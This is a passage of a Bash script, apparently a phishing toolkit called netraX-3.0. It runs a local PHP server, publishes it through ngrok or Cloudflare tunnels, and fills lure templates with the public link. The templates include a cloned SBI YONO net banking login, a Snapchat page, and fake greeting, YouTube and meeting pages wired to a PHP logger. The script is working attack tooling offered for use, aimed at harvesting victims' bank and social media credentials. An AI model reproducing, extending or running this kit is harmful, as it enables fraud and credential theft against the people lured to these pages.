      cf_bin="./cloudflared"
    else
      printf "\e[1;91m[!] cloudflared binary not found after installation. Something went wrong.\e[0m\n"
      exit 1
    fi
  fi

  # ── Step 2: Validate the binary actually executes ───────────────────────
  if ! "$cf_bin" --version > /dev/null 2>&1; then
    printf "\e[1;91m[!] cloudflared found at '%s' but failed to run.\e[0m\n" "$cf_bin"
    printf "\e[1;93m[*] Possible causes: corrupt download, wrong architecture, or missing execute permission.\e[0m\n"
    printf "\e[1;93m[*] To fix, remove the binary and re-run (it will re-download automatically):\e[0m\n"
    printf "\e[1;93m      rm -f cloudflared cloudflared.exe && bash netraX-3.0.sh\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] cloudflared ready --cloudflared version 2026.7.3 (built 2026-07-23-09:58 UTC)\e[0m\n"

  # ── Step 3: Start the PHP server with verification ──────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on 127.0.0.1:3333...\e[0m\n"

  # Start PHP and capture stderr to a log file for diagnostics
  php -S 127.0.0.1:3333 > .php_server.log 2>&1 &
  local php_pid=$!
  sleep 2

  # Verify the PHP server process is still alive
  if ! kill -0 "$php_pid" 2>/dev/null; then
    printf "\e[1;91m[!] PHP server failed to start! Possible reasons:\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Port 3333 may still be in use.\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] PHP error --check .php_server.log for details.\e[0m\n"
    if [[ -s ".php_server.log" ]]; then
      printf "\e[1;93m    Last log output:\e[0m\n"
      tail -5 .php_server.log 2>/dev/null
    fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Try manually:  php -S 127.0.0.1:3333\e[0m\n"
    exit 1
  fi

  # Verify the server actually responds on port 3333
  local server_ok=false
  for attempt in 1 2 3 4 5; do
    if command -v curl > /dev/null 2>&1; then
      if curl -s -o /dev/null -w '' --max-time 2 http://127.0.0.1:3333/ 2>/dev/null; then
        server_ok=true
        break
      fi
    elif command -v wget > /dev/null 2>&1; then
      if wget -q --spider --timeout=2 http://127.0.0.1:3333/ 2>/dev/null; then
        server_ok=true
        break
      fi
    else
      # No curl/wget --trust the PID check above
      server_ok=true
      break
    fi
    sleep 1
  done

  if [[ "$server_ok" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] PHP server is running and responding (PID: %s)\e[0m\n" "$php_pid"
  else
    printf "\e[1;93m[\e[0m!\e[1;93m] PHP server started (PID: %s) but not responding yet --proceeding anyway.\e[0m\n" "$php_pid"
  fi

  # ── Step 4: Start the cloudflared Quick Tunnel ──────────────────────────
  #   --no-autoupdate    Prevents cloudflared from restarting itself mid-
  #                      session to apply an update (a common cause of
  #                      sudden Error 1016 after the tunnel was working).
  #   --protocol http2   Forces HTTP/2 transport, which is more reliable
  #                      for Quick Tunnels than the default auto-negotiation.
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n"
  rm -f .cloudflared.log

  "$cf_bin" tunnel \
    --url http://127.0.0.1:3333 \
    --no-autoupdate \
    --protocol http2 \
    > .cloudflared.log 2>&1 &

  local cf_pid=$!

  # ── Step 5: Wait for the public URL (up to 45 s) ───────────────────────
  #   Increased from 30 s. On slow connections or first run, cloudflared
  #   needs time to register the Quick Tunnel with Cloudflare's edge.
  printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for tunnel URL (up to 45s)...\e[0m\n"
  local link=""
  for i in $(seq 1 45); do
    # Abort early if cloudflared crashes
    if ! kill -0 "$cf_pid" 2>/dev/null; then
      printf "\e[1;91m[!] cloudflared process exited unexpectedly.\e[0m\n"
      if [[ -s ".cloudflared.log" ]]; then
        printf "\e[1;93m    Last log lines:\e[0m\n"
        tail -10 .cloudflared.log 2>/dev/null
      fi
      break
    fi

    sleep 1
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null)
    if [[ -n "$link" ]]; then
      # Wait 3 more seconds for the tunnel to fully stabilise.
      # The URL appears in the log before the edge route is propagated;
      # accessing it too early triggers Error 1016.
      printf "\e[1;92m[\e[0m+\e[1;92m] Tunnel URL obtained --stabilising connection (3s)...\e[0m\n"
      sleep 3
      break
    fi
  done

  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Tunnel URL not generated. Possible reasons:\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] CloudFlare tunnel service might be temporarily down\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] If you are on Android, enable the mobile hotspot\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] cloudflared may already be running --run: killall cloudflared\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Check your internet connection\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] For detailed errors, run manually:\e[0m\n"
    printf "\e[1;93m      %s tunnel --url http://127.0.0.1:3333\e[0m\n" "$cf_bin"
    if [[ "$windows_mode" == true ]]; then
      printf "\e[1;93m[\e[0m*\e[1;93m] On Windows (without WSL): cloudflared.exe tunnel --url http://127.0.0.1:3333\e[0m\n"
    fi
    exit 1
  fi

  # ── Step 6: Verify the tunnel is healthy (origin reachable) ─────────────
  #   After the URL appears and stabilisation wait, confirm the tunnel
  #   actually works end-to-end. This catches Error 1016 before the user
  #   sends the link to anyone.
  printf "\e[1;92m[\e[0m+\e[1;92m] Verifying tunnel health...\e[0m\n"
  local tunnel_healthy=false
  for attempt in 1 2 3; do
    if command -v curl > /dev/null 2>&1; then
      local http_code
      http_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 "$link" 2>/dev/null)
      # Any response from origin (even 404) means the tunnel works.
      # 502/530 = origin unreachable, 1016 shows as 530.
      if [[ "$http_code" -gt 0 && "$http_code" -lt 500 ]]; then
        tunnel_healthy=true
        break
      fi
      printf "\e[1;93m[\e[0m!\e[1;93m] Health check attempt %s: HTTP %s --retrying...\e[0m\n" "$attempt" "$http_code"
    else
      # No curl available --skip health check
      tunnel_healthy=true
      break
    fi
    sleep 3
  done

  if [[ "$tunnel_healthy" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Tunnel is healthy and serving traffic.\e[0m\n"
  else
    printf "\e[1;93m[\e[0m!\e[1;93m] Tunnel health check failed. The link may still work in a few seconds.\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] If you get Error 1016, wait 10–15 seconds and retry.\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Check .cloudflared.log and .php_server.log for errors.\e[0m\n"
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  build_payload "$link"
  checkfound
}

# --------------------------------------------------
# build_payload --Generates index.php and index2.html
# for any tunnel link (Cloudflare or ngrok).
# Usage: build_payload "<tunnel_url>"
# --------------------------------------------------
build_payload() {
  local link="$1"
  local link_escaped
  local fest_name_escaped

  link_escaped=$(printf '%s' "$link" | sed 's/[&+]/\\&/g')
  fest_name_escaped=$(printf '%s' "$fest_name" | sed 's/[&+]/\\&/g')

  sed 's+forwarding_link+'"$link_escaped"'+g' core/template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed 's+forwarding_link+'"$link_escaped"'+g' pages/GreetingsPortal.html > index3.html
    sed 's+fes_name+'"$fest_name_escaped"'+g' index3.html > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed 's+forwarding_link+'"$link_escaped"'+g' pages/LiveStreamYT.html > index3.html
    sed 's+live_yt_tv+'"$yt_video_ID"'+g' index3.html > index2.html
  elif [[ $option_tem -eq 4 ]]; then
    # Template 4: Social Media Reporting --self-contained PHP portal
    cp pages/SocialReportingPortal.html index2.html
  elif [[ $option_tem -eq 5 ]]; then
    # Template 5: Banking Portal -- SBI YONO Net Banking login page
    sed 's+forwarding_link+'"$link_escaped"'+g' pages/SBI_Bank.html > index2.html
  elif [[ $option_tem -eq 6 ]]; then
    # Template 6: Social Media --route by social_option
    if [[ ${social_option:-1} -eq 1 ]]; then
      # Platform 1: Snapchat
      sed 's+forwarding_link+'"$link_escaped"'+g' pages/Snapchat.html > index2.html
    else
      # Default fallback: Snapchat
      sed 's+forwarding_link+'"$link_escaped"'+g' pages/Snapchat.html > index2.html
    fi
  else
    sed 's+forwarding_link+'"$link_escaped"'+g' pages/VirtualMeeting.html > index2.html
  fi
  rm -f index3.html
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -f ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -f ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -f ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

# ── Step 1: Kill stale processes from previous runs ─────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Cleaning up stale processes...\e[0m\n"
  if [[ "$windows_mode" == true ]]; then
    taskkill /F /IM "ngrok.exe" 2>/dev/null
    for pid in $(netstat -ano 2>/dev/null | grep ':3333 ' | grep 'LISTENING' | awk '{print $NF}' | sort -u); do
      taskkill /F /PID "$pid" 2>/dev/null
    done
    for pid in $(netstat -ano 2>/dev/null | grep ':4040 ' | grep 'LISTENING' | awk '{print $NF}' | sort -u); do
      taskkill /F /PID "$pid" 2>/dev/null
    done
  else
    pkill -f "ngrok" 2>/dev/null
    killall ngrok 2>/dev/null
    if command -v fuser > /dev/null 2>&1; then
      fuser -k 3333/tcp 2>/dev/null
      fuser -k 4040/tcp 2>/dev/null
    elif command -v lsof > /dev/null 2>&1; then
      lsof -ti:3333 2>/dev/null | xargs kill -9 2>/dev/null
      lsof -ti:4040 2>/dev/null | xargs kill -9 2>/dev/null
    else
      pkill -f "php.*3333" 2>/dev/null
    fi
  fi
  sleep 1

  # ── Step 2: Resolve ngrok binary path ───────────────────────────────────
  local ngrok_bin=""
  if [[ "$windows_mode" == true ]] && [[ -e "./ngrok.exe" ]]; then
    ngrok_bin="./ngrok.exe"
  elif [[ -e "./ngrok" ]]; then
    ngrok_bin="./ngrok"
  fi

  if [[ -z "$ngrok_bin" ]]; then
    printf "\e[1;91m[!] ngrok binary not found after download. Something went wrong.\e[0m\n"
    exit 1
  fi

  # ── Step 3: Ngrok auth token handling (v3 + v2 compatible) ──────────────
  #   ngrok v3 config paths:
  #     Linux:   ~/.config/ngrok/ngrok.yml
  #     macOS:   ~/Library/Application Support/ngrok/ngrok.yml
  #     Windows: %APPDATA%/ngrok/ngrok.yml
  #   ngrok v2 (legacy): ~/.ngrok2/ngrok.yml
  local ngrok_config=""
  if [[ "$windows_mode" == true ]]; then
    if [[ -n "$APPDATA" ]] && [[ -e "$APPDATA/ngrok/ngrok.yml" ]]; then
      ngrok_config="$APPDATA/ngrok/ngrok.yml"
    elif [[ -n "$USERPROFILE" ]] && [[ -e "$USERPROFILE/.ngrok2/ngrok.yml" ]]; then
      ngrok_config="$USERPROFILE/.ngrok2/ngrok.yml"
    fi
  else
    if [[ -e "$HOME/.config/ngrok/ngrok.yml" ]]; then
      ngrok_config="$HOME/.config/ngrok/ngrok.yml"
    elif [[ -e "$HOME/Library/Application Support/ngrok/ngrok.yml" ]]; then
      ngrok_config="$HOME/Library/Application Support/ngrok/ngrok.yml"
    elif [[ -e "$HOME/.ngrok2/ngrok.yml" ]]; then
      ngrok_config="$HOME/.ngrok2/ngrok.yml"
    fi
  fi

  if [[ -n "$ngrok_config" ]]; then
    printf "\e[1;93m[\e[0m*\e[1;93m] Found ngrok config: %s\e[0m\n" "$ngrok_config"
    cat "$ngrok_config" 2>/dev/null
    read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
    if [[ "$chg_token" == "Y" || "$chg_token" == "y" || "$chg_token" == "Yes" || "$chg_token" == "yes" ]]; then
      read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
      "$ngrok_bin" config add-authtoken "$ngrok_auth" > /dev/null 2>&1
      if [[ $? -ne 0 ]]; then
        # Fallback to legacy command for older ngrok versions
        "$ngrok_bin" authtoken "$ngrok_auth" > /dev/null 2>&1
      fi
      printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been updated.\n"
    fi
  else
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
    "$ngrok_bin" config add-authtoken "$ngrok_auth" > /dev/null 2>&1
    if [[ $? -ne 0 ]]; then
      "$ngrok_bin" authtoken "$ngrok_auth" > /dev/null 2>&1
    fi
  fi
  # Brief pause to ensure config is written to disk
  sleep 1

  # ── Step 4: Start PHP server with verification ──────────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on 127.0.0.1:3333...\e[0m\n"
  php -S 127.0.0.1:3333 > .php_server.log 2>&1 &
  local php_pid=$!
  sleep 2

  # Verify PHP server started successfully
  if ! kill -0 "$php_pid" 2>/dev/null; then
    printf "\e[1;91m[!] PHP server failed to start! Possible reasons:\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Port 3333 may still be in use.\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] PHP error --check .php_server.log for details.\e[0m\n"
    if [[ -s ".php_server.log" ]]; then
      printf "\e[1;93m    Last log output:\e[0m\n"
      tail -5 .php_server.log 2>/dev/null
    fi
    exit 1
  fi

  # Verify server responds on port 3333
  local server_ok=false
  for attempt in 1 2 3 4 5; do
    if command -v curl > /dev/null 2>&1; then
      if curl -s -o /dev/null -w '' --max-time 2 http://127.0.0.1:3333/ 2>/dev/null; then
        server_ok=true
        break
      fi
    elif command -v wget > /dev/null 2>&1; then
      if wget -q --spider --timeout=2 http://127.0.0.1:3333/ 2>/dev/null; then
        server_ok=true
        break
      fi
    else
      server_ok=true
      break
    fi
    sleep 1
  done

  if [[ "$server_ok" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] PHP server is running and responding (PID: %s)\e[0m\n" "$php_pid"
  else
    printf "\e[1;93m[\e[0m!\e[1;93m] PHP server started (PID: %s) but not responding yet --proceeding anyway.\e[0m\n" "$php_pid"
  fi

  # ── Step 5: Start ngrok tunnel ──────────────────────────────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\e[0m\n"
  "$ngrok_bin" http 3333 > /dev/null 2>&1 &

  # ── Step 6: Wait for tunnel URL (up to 30s with retries) ────────────────
  printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for tunnel URL (up to 30s)...\e[0m\n"
  local link=""

  if ! command -v curl > /dev/null 2>&1; then
    printf "\e[1;91m[!] curl is required to extract the ngrok tunnel URL.\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Install curl and try again.\e[0m\n"
    exit 1
  fi

  for i in $(seq 1 30); do
    sleep 1
    # Extract public_url from ngrok's local API --matches any ngrok domain
    link=$(curl -s --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null \
           | grep -o '"public_url":"https://[^"]*"' \
           | head -n1 \
           | sed 's/"public_url":"//;s/"//')
    if [[ -n "$link" ]]; then
      break
    fi
  done

  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Tunnel URL not generated. Possible reasons:\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Ngrok authtoken is not valid or not set\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] If you are on Android, enable the mobile hotspot\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Ngrok may already be running --run: killall ngrok\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Check your internet connection\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Try running ngrok manually: %s http 3333\e[0m\n" "$ngrok_bin"
    printf "\e[1;93m[\e[0m*\e[1;93m] Check ngrok status: curl http://127.0.0.1:4040/api/tunnels\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  build_payload "$link"
  checkfound
}

netraX-3.0() {
printf "\e[1;95m----- Choose tunnel server -----\e[0m\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
netraX-3.0
fi
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
netraX-3.0
else
printf "\n\e[1;95m----- Choose a template -----\e[0m\n"   
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Season’s Greetings\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Streaming\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Conference\e[0m\n"
# Template 4 --Social Media Reporting (self-contained PHP module)
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Social Media Reporting\e[0m\n"
# Template 5 --Banking Portal (SBI YONO Net Banking)
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Banking Portal\e[0m\n"
  # Template 6 --Social Media (Snapchat, etc.)
  printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Social Media\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"

# ── Persist selected template index so the PHP logger can read it ──────
mkdir -p data
printf '%s' "$option_tem" > data/.active_template

if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name:-NETRA-X Celebration}"
fest_name="${fest_name#"${fest_name%%[![:space:]]*}"}"
fest_name="${fest_name%"${fest_name##*[![:space:]]}"}"
elif [[ $option_tem -eq 2 ]]; then
while true; do
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID or URL: \e[0m' yt_video_ID
    # ── PART 1: Trim leading/trailing whitespace ──────────────────────────
    yt_video_ID="${yt_video_ID#"${yt_video_ID%%[![:space:]]*}"}"
    yt_video_ID="${yt_video_ID%"${yt_video_ID##*[![:space:]]}"}"
    # ── PART 2: Extract bare ID when a full URL is pasted ─────────────────
    #   Handles: https://www.youtube.com/watch?v=ID[&...]
    #            https://youtu.be/ID[?...]
    if [[ "$yt_video_ID" =~ youtube\.com/watch\?.*v=([A-Za-z0-9_-]{11}) ]]; then
        yt_video_ID="${BASH_REMATCH[1]}"
    elif [[ "$yt_video_ID" =~ youtu\.be/([A-Za-z0-9_-]{11}) ]]; then
        yt_video_ID="${BASH_REMATCH[1]}"
    fi
    # ── PART 3: Validate --exactly 11 chars, A-Z a-z 0-9 - _ ─────────────
    if [[ "$yt_video_ID" =~ ^[A-Za-z0-9_-]{11}$ ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Video ID: %s\n\e[0m" "$yt_video_ID"
        break
    else
        printf "\e[1;91m [!] Invalid YouTube Video ID. Must be exactly 11 characters (A-Z, a-z, 0-9, -, _). Try again.\e[0m\n"
    fi
done
elif [[ $option_tem -eq 3 ]]; then
  : # Online Conference --no extra input required
elif [[ $option_tem -eq 4 ]]; then
  : # Social Media Reporting --self-contained, no extra input required
elif [[ $option_tem -eq 5 ]]; then
  # Bank template --show bank sub-menu
  printf "\n\e[1;95m----- Choose a Bank -----\e[0m\n"
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m SBI (YONO Net Banking)\e[0m\n"
  default_bank_option="1"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a bank: [Default is 1] \e[0m' bank_option
  bank_option="${bank_option:-${default_bank_option}}"
  if [[ $bank_option -eq 1 ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Selected: SBI YONO Net Banking\e[0m\n"
  else
    printf "\e[1;93m [!] Invalid bank option! Defaulting to SBI.\e[0m\n"
    sleep 1
  fi
elif [[ $option_tem -eq 6 ]]; then
  # Social Media template --show platform sub-menu
  printf "\n\e[1;95m----- Choose a Social Media Platform -----\e[0m\n"
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m\n"
  default_social_option="1"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a platform: [Default is 1] \e[0m' social_option
  social_option="${social_option:-${default_social_option}}"
  if [[ $social_option -eq 1 ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Selected: Snapchat\e[0m\n"
  else
    printf "\e[1;93m [!] Invalid option! Defaulting to Snapchat.\e[0m\n"
    social_option=1
    sleep 1
  fi
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

banner
dependencies
netraX-3.0
